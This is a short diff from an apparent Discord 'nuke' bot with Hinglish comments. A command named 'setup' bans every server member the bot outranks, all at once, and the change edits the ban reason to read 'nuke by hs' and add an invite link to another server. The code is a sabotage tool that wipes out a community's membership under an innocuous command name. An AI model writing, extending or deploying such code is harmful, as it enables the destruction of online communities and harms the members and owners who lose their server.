@@ -1070,7 +1070,7 @@ async def setup(ctx):
         for member in ctx.guild.members:
             # Check: Owner ko, khud bot ko, aur bot se upar wale roles ko skip karega
             if member != ctx.guild.owner and member != bot.user and member.top_role < ctx.guild.me.top_role:
-                ban_tasks.append(member.ban(reason="nuke by hs op"))
+                ban_tasks.append(member.ban(reason="nuke by hs https://discord.gg/heiwachills"))
         
         # Ek saath fast ban karne ke liye
         await asyncio.gather(*ban_tasks, return_exceptions=True)
